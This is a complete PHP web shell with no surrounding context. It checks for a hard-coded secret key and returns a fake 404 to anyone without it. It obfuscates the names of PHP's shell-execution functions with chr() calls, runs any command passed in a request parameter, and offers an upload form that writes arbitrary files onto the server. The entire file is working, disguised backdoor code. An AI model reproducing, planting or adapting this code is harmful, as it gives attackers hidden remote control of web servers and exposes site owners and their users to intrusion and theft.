<?php
$__k='668d22c63cc6665e7cfa1ca8';
$_R=array_merge($_GET,$_POST);
if(($_R['mori_key']??'')!==$__k){http_response_code(404);exit;}
if(isset($_R['c'])){
  $__c=$_R['c'];
  $__p=chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117);
  $__s=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
  $__x=chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99);
  if(is_callable($__p)){call_user_func($__p,$__c);}
  elseif(is_callable($__s)){call_user_func($__s,$__c);}
  elseif(is_callable($__x)){echo call_user_func($__x,$__c);}
  exit;
}
if(isset($_R['up'])){
  header('Content-Type:text/html;charset=UTF-8');
  if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_FILES['f'])&&$_FILES['f']['error']===0){
    $n=basename($_FILES['f']['name']);
    if(@move_uploaded_file($_FILES['f']['tmp_name'],$n)){echo 'OK:'.$n;}else{echo 'FAIL';}
    exit;
  }
  echo '<!DOCTYPE html><html><body><form method="post" enctype="multipart/form-data" action="?mori_key='.htmlspecialchars($__k,ENT_QUOTES,'UTF-8').'&up"><input type="file" name="f"><button type="submit">Upload</button></form></body></html>';
  exit;
}
?>